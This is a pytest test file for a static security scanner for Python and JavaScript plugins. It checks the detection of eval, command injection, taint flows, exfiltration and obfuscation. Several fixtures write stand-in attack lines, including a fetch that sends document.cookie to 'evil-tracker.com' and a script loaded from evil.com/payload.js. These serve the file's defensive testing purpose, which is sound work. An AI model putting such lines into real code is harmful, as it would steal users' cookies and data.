"""Phase 2 tests: Static analysis — Python AST + JS AST/regex scanners."""

from pathlib import Path

import pytest

from app.models import Severity
from app.scanner.static_python import scan_python_file, scan_python_repo
from app.scanner.static_js import scan_js_file, scan_js_repo


class TestPythonScanner:
    def test_dangerous_file(self, fixture_dangerous_py):
        """Dangerous patterns should be detected."""
        init_file = fixture_dangerous_py / "custom_components" / "evil" / "__init__.py"
        findings = scan_python_file(init_file)

        categories = {f.category for f in findings}
        severities = {f.severity for f in findings}

        assert "code_injection" in categories  # eval, exec
        assert "command_execution" in categories  # subprocess, os.system
        assert "deserialization" in categories  # pickle
        assert "native_code" in categories  # ctypes
        assert Severity.CRITICAL in severities

    def test_safe_file(self, fixture_safe_py):
        """Safe code should produce no findings (or only info)."""
        init_file = fixture_safe_py / "custom_components" / "safe" / "__init__.py"
        findings = scan_python_file(init_file)

        high_or_above = [f for f in findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(high_or_above) == 0

    def test_eval_detected(self, tmp_path):
        f = tmp_path / "code.py"
        f.write_text('result = eval(user_input)\n')
        findings = scan_python_file(f)
        assert any(f.category == "code_injection" and f.severity == Severity.CRITICAL for f in findings)

    def test_exec_detected(self, tmp_path):
        f = tmp_path / "code.py"
        f.write_text('exec(some_code)\n')
        findings = scan_python_file(f)
        assert any(f.category == "code_injection" and f.severity == Severity.CRITICAL for f in findings)

    def test_subprocess_detected(self, tmp_path):
        f = tmp_path / "code.py"
        f.write_text('import subprocess\nsubprocess.run(["ls"])\n')
        findings = scan_python_file(f)
        assert any(f.category == "command_execution" for f in findings)

    def test_network_module_detected(self, tmp_path):
        f = tmp_path / "code.py"
        f.write_text('import requests\nrequests.get("http://example.com")\n')
        findings = scan_python_file(f)
        assert any(f.category == "network" for f in findings)

    def test_syntax_error_handled(self, tmp_path):
        f = tmp_path / "broken.py"
        f.write_text('def broken(\n')
        findings = scan_python_file(f)
        # Should not raise, just skip AST
        assert isinstance(findings, list)

    def test_large_file_skipped(self, tmp_path):
        from unittest.mock import patch
        f = tmp_path / "big.py"
        f.write_text('x = 1\n' * 200000)  # >500KB
        with patch("app.config.settings.max_file_size_kb", 500):
            findings = scan_python_file(f)
        assert any(f.category == "size" for f in findings)

    def test_repo_skips_tests_dir(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        tests_dir = repo / "tests"
        tests_dir.mkdir()
        (tests_dir / "test_evil.py").write_text('eval("1+1")\n')
        (repo / "main.py").write_text('x = 1\n')
        findings = scan_python_repo(repo)
        assert not any("test_evil" in f.file for f in findings)

    def test_repo_skips_venv(self, tmp_path):
        repo = tmp_path / "repo"
        venv = repo / ".venv" / "lib"
        venv.mkdir(parents=True)
        (venv / "evil.py").write_text('eval("1")\n')
        (repo / "main.py").write_text('x = 1\n')
        findings = scan_python_repo(repo)
        assert not any(".venv" in f.file for f in findings)


class TestPythonTaintFlow:
    """Tests for Python data flow / taint tracking analysis."""

    def test_config_entry_to_eval(self, tmp_path):
        """config_entry.data flowing into eval() should be CRITICAL."""
        f = tmp_path / "taint.py"
        f.write_text(
            'def setup(hass, config_entry):\n'
            '    cmd = config_entry.data["command"]\n'
            '    result = eval(cmd)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_code_injection" and f.severity == Severity.CRITICAL
                   for f in findings)

    def test_config_entry_to_subprocess_shell(self, tmp_path):
        """config_entry.data flowing to subprocess.run(shell=True) = CRITICAL."""
        f = tmp_path / "taint_cmd.py"
        f.write_text(
            'import subprocess\n'
            'def run_cmd(config_entry):\n'
            '    cmd = config_entry.data.get("cmd")\n'
            '    subprocess.run(cmd, shell=True)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_command_injection" and f.severity == Severity.CRITICAL
                   for f in findings)

    def test_config_entry_to_subprocess_no_shell(self, tmp_path):
        """config_entry.data to subprocess.run() without shell=True = HIGH."""
        f = tmp_path / "taint_cmd2.py"
        f.write_text(
            'import subprocess\n'
            'def run_cmd(entry):\n'
            '    cmd = entry.data["cmd"]\n'
            '    subprocess.run(cmd)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_command_injection" and f.severity == Severity.HIGH
                   for f in findings)

    def test_tainted_fstring_to_system(self, tmp_path):
        """Tainted var in f-string passed to os.system()."""
        f = tmp_path / "taint_fstr.py"
        f.write_text(
            'import os\n'
            'def do_thing(config_entry):\n'
            '    host = config_entry.data["host"]\n'
            '    cmd = f"ping {host}"\n'
            '    os.system(cmd)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_command_injection" for f in findings)

    def test_tainted_path_traversal(self, tmp_path):
        """User input in open() = path traversal risk."""
        f = tmp_path / "taint_path.py"
        f.write_text(
            'def read_file(config_entry):\n'
            '    path = config_entry.data["file_path"]\n'
            '    with open(path) as fh:\n'
            '        return fh.read()\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_path_traversal" for f in findings)

    def test_safe_code_no_taint(self, tmp_path):
        """Code using only literals should not produce taint findings."""
        f = tmp_path / "safe.py"
        f.write_text(
            'import subprocess\n'
            'def safe_func():\n'
            '    subprocess.run(["ls", "-la"])\n'
        )
        findings = scan_python_file(f)
        taint_findings = [f for f in findings if f.category.startswith("taint_")]
        assert len(taint_findings) == 0

    def test_taint_overwritten_is_safe(self, tmp_path):
        """If tainted var is overwritten with a safe value, it should not trigger."""
        f = tmp_path / "overwrite.py"
        f.write_text(
            'def func(config_entry):\n'
            '    cmd = config_entry.data["x"]\n'
            '    cmd = "safe_value"\n'
            '    eval(cmd)\n'
        )
        findings = scan_python_file(f)
        taint_findings = [f for f in findings if f.category.startswith("taint_")]
        assert len(taint_findings) == 0

    def test_hass_data_is_tainted(self, tmp_path):
        """hass.data[DOMAIN] should be treated as potentially tainted."""
        f = tmp_path / "hass_data.py"
        f.write_text(
            'def setup(hass):\n'
            '    stored = hass.data["my_domain"]\n'
            '    eval(stored)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_code_injection" for f in findings)

    def test_request_json_to_exec(self, tmp_path):
        """request.json flowing to exec() — web handler injection."""
        f = tmp_path / "web_handler.py"
        f.write_text(
            'async def handle_post(request):\n'
            '    data = request.json\n'
            '    exec(data)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_code_injection" for f in findings)

    def test_pickle_loads_tainted(self, tmp_path):
        """pickle.loads() with tainted data = deserialization attack."""
        f = tmp_path / "deser.py"
        f.write_text(
            'import pickle\n'
            'def load_data(config_entry):\n'
            '    raw = config_entry.data["payload"]\n'
            '    obj = pickle.loads(raw)\n'
        )
        findings = scan_python_file(f)
        assert any(f.category == "taint_deserialization" for f in findings)


class TestJSScanner:
    def test_dangerous_file(self, fixture_dangerous_js):
        js_file = fixture_dangerous_js / "evil-card.js"
        findings = scan_js_file(js_file)

        categories = {f.category for f in findings}
        assert "code_injection" in categories  # eval, Function
        assert "xss" in categories  # document.write
        assert "data_exfiltration" in categories  # sendBeacon
        assert "data_access" in categories  # document.cookie
        assert "telemetry" in categories  # gtag

    def test_safe_file(self, fixture_safe_js):
        js_file = fixture_safe_js / "safe-card.js"
        findings = scan_js_file(js_file)

        high_or_above = [f for f in findings if f.severity in (Severity.CRITICAL, Severity.HIGH)]
        assert len(high_or_above) == 0

    def test_eval_detected(self, tmp_path):
        f = tmp_path / "code.js"
        f.write_text('var x = eval("1+1");\n')
        findings = scan_js_file(f)
        assert any(f.severity == Severity.CRITICAL and f.category == "code_injection" for f in findings)

    def test_innerhtml_detected(self, tmp_path):
        f = tmp_path / "code.js"
        f.write_text('el.innerHTML = userInput;\n')
        findings = scan_js_file(f)
        assert any(f.category == "xss" for f in findings)

    def test_websocket_detected(self, tmp_path):
        f = tmp_path / "code.js"
        f.write_text('const ws = new WebSocket("wss://example.com");\n')
        findings = scan_js_file(f)
        assert any(f.category == "network" for f in findings)

    def test_repo_skips_node_modules(self, tmp_path):
        repo = tmp_path / "repo"
        nm = repo / "node_modules" / "lib"
        nm.mkdir(parents=True)
        (nm / "evil.js").write_text('eval("1");\n')
        (repo / "card.js").write_text('var x = 1;\n')
        findings = scan_js_repo(repo)
        assert not any("node_modules" in f.file for f in findings)

    def test_multiple_extensions(self, tmp_path):
        repo = tmp_path / "repo"
        repo.mkdir()
        (repo / "comp.ts").write_text('eval("bad");\n')
        (repo / "comp.tsx").write_text('var y = 1;\n')
        (repo / "readme.txt").write_text('eval("ignored")\n')
        findings = scan_js_repo(repo)
        assert any("comp.ts" in f.file for f in findings)
        assert not any("readme.txt" in f.file for f in findings)


class TestJSScannerAST:
    """Tests specific to AST-based JS analysis."""

    def test_no_false_positive_in_comments(self, tmp_path):
        """eval in a comment should NOT trigger a finding via AST."""
        f = tmp_path / "commented.js"
        f.write_text(
            '// eval("this is just a comment")\n'
            'var x = 1;\n'
        )
        findings = scan_js_file(f)
        assert not any(f.category == "code_injection" for f in findings)

    def test_no_false_positive_in_strings(self, tmp_path):
        """The word 'eval' inside a string literal should NOT trigger."""
        f = tmp_path / "stringy.js"
        f.write_text(
            'var msg = "do not use eval in production";\n'
            'console.log(msg);\n'
        )
        findings = scan_js_file(f)
        assert not any(f.category == "code_injection" for f in findings)

    def test_settimeout_string_arg_detected(self, tmp_path):
        """setTimeout with a string argument acts as eval — should be HIGH."""
        f = tmp_path / "timer.js"
        f.write_text('setTimeout("alert(1)", 1000);\n')
        findings = scan_js_file(f)
        assert any(
            f.category == "code_injection" and f.severity == Severity.HIGH
            for f in findings
        )

    def test_settimeout_function_arg_clean(self, tmp_path):
        """setTimeout with a function argument is safe."""
        f = tmp_path / "timer_ok.js"
        f.write_text('setTimeout(function() { console.log(1); }, 1000);\n')
        findings = scan_js_file(f)
        assert not any(f.category == "code_injection" for f in findings)

    def test_new_image_detected(self, tmp_path):
        """new Image() — potential exfiltration vector."""
        f = tmp_path / "img.js"
        f.write_text('var img = new Image();\nimg.src = "https://evil.com/track?d=" + data;\n')
        findings = scan_js_file(f)
        assert any(f.category == "data_exfiltration" for f in findings)

    def test_innerhtml_assignment(self, tmp_path):
        """x.innerHTML = ... should be detected via AST AssignmentExpression."""
        f = tmp_path / "xss.js"
        f.write_text('document.getElementById("app").innerHTML = userInput;\n')
        findings = scan_js_file(f)
        assert any(f.category == "xss" for f in findings)

    def test_document_createelement_script(self, tmp_path):
        """document.createElement('script') should be HIGH."""
        f = tmp_path / "script_inject.js"
        f.write_text('var s = document.createElement("script");\n')
        findings = scan_js_file(f)
        assert any(
            f.category == "script_injection" and f.severity == Severity.HIGH
            for f in findings
        )

    def test_document_createelement_div_lower(self, tmp_path):
        """document.createElement('div') should be MEDIUM, not HIGH."""
        f = tmp_path / "div_create.js"
        f.write_text('var d = document.createElement("div");\n')
        findings = scan_js_file(f)
        high_script = [f for f in findings
                       if f.category == "script_injection" and f.severity == Severity.HIGH]
        assert len(high_script) == 0

    def test_fetch_info_level(self, tmp_path):
        """fetch() should be INFO, not a high severity."""
        f = tmp_path / "net.js"
        f.write_text('fetch("/api/data").then(function(r) { return r.json(); });\n')
        findings = scan_js_file(f)
        assert any(f.category == "network" and f.severity == Severity.INFO for f in findings)

    def test_localstorage_detected(self, tmp_path):
        f = tmp_path / "storage.js"
        f.write_text('localStorage.setItem("key", "value");\n')
        findings = scan_js_file(f)
        assert any(f.category == "data_access" for f in findings)

    def test_regex_fallback_on_es2020(self, tmp_path):
        """Files with ES2020+ syntax (optional chaining) should fall back to regex."""
        f = tmp_path / "modern.js"
        f.write_text(
            'const val = obj?.nested?.prop;\n'
            'eval("bad");\n'
        )
        findings = scan_js_file(f)
        # Should still detect eval via regex fallback
        assert any(f.category == "code_injection" for f in findings)
        # Should have parse_info noting fallback
        assert any(f.category == "parse_info" for f in findings)

    def test_src_external_url_detected(self, tmp_path):
        """.src = 'https://...' assignment should flag script_injection."""
        f = tmp_path / "ext.js"
        f.write_text('var s = document.createElement("script");\ns.src = "https://evil.com/payload.js";\n')
        findings = scan_js_file(f)
        assert any(f.category == "script_injection" for f in findings)

    def test_line_numbers_present(self, tmp_path):
        """AST findings should include correct line numbers."""
        f = tmp_path / "lines.js"
        f.write_text('var x = 1;\nvar y = 2;\neval("bad");\n')
        findings = scan_js_file(f)
        eval_findings = [f for f in findings if f.category == "code_injection"]
        assert len(eval_findings) > 0
        assert eval_findings[0].line == 3


class TestObfuscationDetection:
    """Tests for deliberate code obfuscation detection."""

    def test_hex_var_obfuscation_detected(self, tmp_path):
        """Classic _0x obfuscation pattern should be flagged as HIGH."""
        f = tmp_path / "obfuscated.js"
        f.write_text(
            'function _0x3ff6(_0x466405,_0x3a51bd){_0x466405=_0x466405-0x17d;'
            'const _0x43e626=_0x43e6();let _0x3ff61a=_0x43e626[_0x466405];'
            'var _0x215501=function(_0x478595){return _0x478595;};'
            'var _0x52447e=_0x43e626[0x0];'
            'var _0x15534f=_0x466405+_0x52447e;'
            'return _0x3ff61a;}\n'
        )
        findings = scan_js_file(f)
        obf = [fi for fi in findings if fi.category == "obfuscation"]
        assert len(obf) >= 1
        assert obf[0].severity == Severity.HIGH
        assert "_0x" in obf[0].description or "hex" in obf[0].description.lower()

    def test_minified_code_not_flagged(self, tmp_path):
        """Normal minified code should NOT trigger obfuscation detection."""
        f = tmp_path / "minified.js"
        f.write_text(
            'var a=1,b=2,c=function(d){return d+a};'
            'function e(f,g){return f*g+b}'
            'var h=e(3,4);console.log(h);\n'
        )
        findings = scan_js_file(f)
        obf = [fi for fi in findings if fi.category == "obfuscation" and fi.severity == Severity.HIGH]
        assert len(obf) == 0

    def test_string_rotation_detected(self, tmp_path):
        """String array push/shift rotation pattern should be noted."""
        f = tmp_path / "rotated.js"
        f.write_text(
            "function _0x43e6(){return ['a','b','c'];}\n"
            "var _0x1234 = _0x43e6();\n"
            "var _0x5678 = _0x1234;\n"
            "var _0x9abc = _0x5678;\n"
            "var _0xdef0 = _0x9abc;\n"
            "var _0xaaaa = _0xdef0;\n"
            "_0x1234['push'](_0x1234['shift']());\n"
        )
        findings = scan_js_file(f)
        obf = [fi for fi in findings if fi.category == "obfuscation" and fi.severity == Severity.HIGH]
        assert len(obf) >= 1
        assert any("rotation" in fi.description.lower() for fi in obf)

    def test_hidden_urls_in_obfuscated_code(self, tmp_path):
        """External URLs in obfuscated code should flag data_exfiltration."""
        f = tmp_path / "phoning.js"
        f.write_text(
            "var _0x1111=1;var _0x2222=2;var _0x3333=3;"
            "var _0x4444=4;var _0x5555=5;var _0x6666=6;"
            "fetch('https://evil-tracker.com/collect?data='+document.cookie);\n"
        )
        findings = scan_js_file(f)
        exfil = [fi for fi in findings if fi.category == "data_exfiltration"]
        assert len(exfil) >= 1
        assert any("evil-tracker.com" in fi.description for fi in exfil)

    def test_safe_urls_not_flagged(self, tmp_path):
        """GitHub and HA URLs in obfuscated code should not flag exfiltration."""
        f = tmp_path / "safe_urls.js"
        f.write_text(
            "var _0x1111=1;var _0x2222=2;var _0x3333=3;"
            "var _0x4444=4;var _0x5555=5;var _0x6666=6;"
            "fetch('https://github.com/user/repo');\n"
        )
        findings = scan_js_file(f)
        exfil = [fi for fi in findings if fi.category == "data_exfiltration"]
        assert len(exfil) == 0

    def test_hidden_paywall_detected(self, tmp_path):
        """License/activation system in obfuscated code should be flagged."""
        f = tmp_path / "paywall.js"
        lines = [
            "var _0x1111=1;var _0x2222=2;var _0x3333=3;",
            "var _0x4444=4;var _0x5555=5;var _0x6666=6;",
        ]
        # Use words that match \blicense\b and \bactivation\b
        for i in range(15):
            lines.append(f"if(checkLicense('license')){{return license;}}")
        for i in range(5):
            lines.append(f"doActivation('activation');")
        for i in range(3):
            lines.append(f"var premium = true;")
        f.write_text("\n".join(lines))
        findings = scan_js_file(f)
        paywall = [fi for fi in findings if fi.category == "hidden_paywall"]
        assert len(paywall) == 1
        assert paywall[0].severity == Severity.HIGH

    def test_hidden_payment_detected(self, tmp_path):
        """PayPal integration in obfuscated code should be flagged."""
        f = tmp_path / "payment.js"
        lines = [
            "var _0x1111=1;var _0x2222=2;var _0x3333=3;",
            "var _0x4444=4;var _0x5555=5;var _0x6666=6;",
        ]
        for i in range(10):
            lines.append(f"var paypal_{i}='https://www.paypal.com/pay/{i}';")
        f.write_text("\n".join(lines))
        findings = scan_js_file(f)
        payment = [fi for fi in findings if fi.category == "hidden_payment"]
        assert len(payment) == 1
        assert "PayPal" in payment[0].description

    def test_iframe_injection_detected(self, tmp_path):
        """Multiple iframe references in obfuscated code should be flagged."""
        f = tmp_path / "iframe.js"
        f.write_text(
            "var _0x1111=1;var _0x2222=2;var _0x3333=3;"
            "var _0x4444=4;var _0x5555=5;var _0x6666=6;"
            "document.createElement('iframe');"
            "el.innerHTML='<iframe src=\"x\"></iframe>';"
            "var tag='iframe';\n"
        )
        findings = scan_js_file(f)
        iframe = [fi for fi in findings if fi.category == "iframe_injection"]
        assert len(iframe) == 1

    def test_no_paywall_in_clean_code(self, tmp_path):
        """Normal code with a few license mentions should not trigger paywall."""
        f = tmp_path / "normal.js"
        f.write_text(
            "// MIT License\n"
            "// Licensed under MIT\n"
            "var license = 'MIT';\n"
            "console.log('hello');\n"
        )
        findings = scan_js_file(f)
        paywall = [fi for fi in findings if fi.category == "hidden_paywall"]
        assert len(paywall) == 0

    def test_paypal_regex_fallback(self, tmp_path):
        """PayPal in code that falls back to regex should flag payment."""
        f = tmp_path / "paypal_es2020.js"
        # Use ES2020+ syntax to force regex fallback
        f.write_text(
            "const x = obj?.nested?.prop ?? 'default';\n"
            "fetch('https://www.paypal.com/donate');\n"
        )
        findings = scan_js_file(f)
        payment = [fi for fi in findings if fi.category == "payment"]
        assert len(payment) >= 1
        assert "PayPal" in payment[0].description

    def test_iframe_createElement_regex(self, tmp_path):
        """createElement('iframe') should be detected by regex fallback."""
        f = tmp_path / "iframe_create.js"
        f.write_text("var f = document.createElement('iframe');\nf.src='https://evil.com';\n")
        findings = scan_js_file(f)
        iframe = [fi for fi in findings if fi.category == "script_injection" and "iframe" in fi.description.lower()]
        assert len(iframe) >= 1


class TestNoiseReduction:
    """Tests for finding cap, network aggregation, and re.compile() filtering."""

    def test_re_compile_not_flagged(self, tmp_path):
        """re.compile() should NOT be flagged as code_injection."""
        f = tmp_path / "regexes.py"
        f.write_text("import re\npattern = re.compile(r'\\d+')\n")
        findings = scan_python_file(f)
        code_inj = [fi for fi in findings if fi.category == "code_injection"]
        assert len(code_inj) == 0

    def test_builtin_compile_still_flagged(self, tmp_path):
        """Built-in compile() should still be flagged."""
        f = tmp_path / "evil_compile.py"
        f.write_text("code = compile('print(1)', '<string>', 'exec')\n")
        findings = scan_python_file(f)
        code_inj = [fi for fi in findings if fi.category == "code_injection"]
        assert len(code_inj) >= 1

    def test_compile_severity_medium(self, tmp_path):
        """compile() severity should be MEDIUM, not HIGH."""
        f = tmp_path / "compile_sev.py"
        f.write_text("code = compile('x', 'f', 'exec')\n")
        findings = scan_python_file(f)
        code_inj = [fi for fi in findings if fi.category == "code_injection"]
        assert code_inj[0].severity == Severity.MEDIUM

    def test_python_per_file_cap(self, tmp_path):
        """More than 3 findings of same category in one file should be capped."""
        init = tmp_path / "custom_components" / "cap" / "__init__.py"
        init.parent.mkdir(parents=True)
        manifest = tmp_path / "custom_components" / "cap" / "manifest.json"
        manifest.write_text('{"domain":"cap","name":"Cap"}')
        # 10 network imports = should be capped to 3 per file + aggregated
        lines = [f"import {m}" for m in ["requests", "httpx", "urllib", "aiohttp",
                 "socket", "ftplib", "smtplib", "urllib3"]]
        init.write_text("\n".join(lines) + "\n")
        findings = scan_python_repo(tmp_path)
        network = [f for f in findings if f.category == "network"]
        # Per-file cap (3) + aggregation (max 5 kept + 1 summary)
        assert len(network) <= 6

    def test_js_per_file_cap(self, tmp_path):
        """JS findings should be capped per category per file via scan_js_repo."""
        f = tmp_path / "noisy.js"
        # 10 innerHTML assignments
        lines = ["el{0}.innerHTML = data{0};".format(i) for i in range(10)]
        f.write_text("\n".join(lines))
        findings = scan_js_repo(tmp_path)
        xss = [fi for fi in findings if fi.category == "xss"]
        assert len(xss) <= 3

    def test_appendchild_not_flagged(self, tmp_path):
        """appendChild should no longer generate findings (too noisy)."""
        f = tmp_path / "append.js"
        f.write_text("container.appendChild(div);\nparent.appendChild(child);\n")
        findings = scan_js_file(f)
        dom = [fi for fi in findings if fi.category == "dom_manipulation"]
        assert len(dom) == 0

    def test_vendor_files_skipped(self, tmp_path):
        """Vendor files like docsify.min.js should be skipped."""
        vendor = tmp_path / "docsify.min.js"
        vendor.write_text("eval('malicious');")
        findings = scan_js_repo(tmp_path)
        assert len([f for f in findings if "docsify" in (f.file or "")]) == 0

    def test_docs_dir_skipped(self, tmp_path):
        """Files in docs/ directory should be skipped."""
        docs = tmp_path / "docs"
        docs.mkdir()
        f = docs / "helper.js"
        f.write_text("eval('test');")
        findings = scan_js_repo(tmp_path)
        assert len(findings) == 0
